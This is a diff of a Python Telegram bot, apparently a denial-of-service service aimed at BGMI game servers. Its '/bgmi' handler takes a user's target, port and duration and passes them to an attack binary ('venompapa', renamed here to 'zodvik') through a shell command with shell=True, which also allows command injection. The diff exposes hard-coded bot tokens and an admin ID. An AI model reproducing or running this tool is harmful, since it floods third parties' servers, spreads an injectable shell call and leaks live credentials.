@@ -8,7 +8,7 @@ import os
 from keep_alive import keep_alive
 keep_alive()
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7629196394:AAFJvs-m1-wrtkmm8LU5MdFQx84HWX7bN78')
+bot = telebot.TeleBot('7629196394:AAF_j7iGcbxb-9mF9MOmycCJS0zwaoeBf-E')
 
 # Admin user IDs
 admin_id = {"5666606072"}
@@ -238,7 +238,7 @@ def handle_bgmi(message):
                 record_command_logs(user_id, '/bgmi', target, port, time)
                 log_command(user_id, target, port, time)
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
-                full_command = f"./venompapa {target} {port} {time} 100"
+                full_command = f"./zodvik {target} {port} {time} 200"
                 subprocess.run(full_command, shell=True)
                 response = f"BGMI Attack Finished. Target: {target} Port: {port} Port: {time}"
         else:
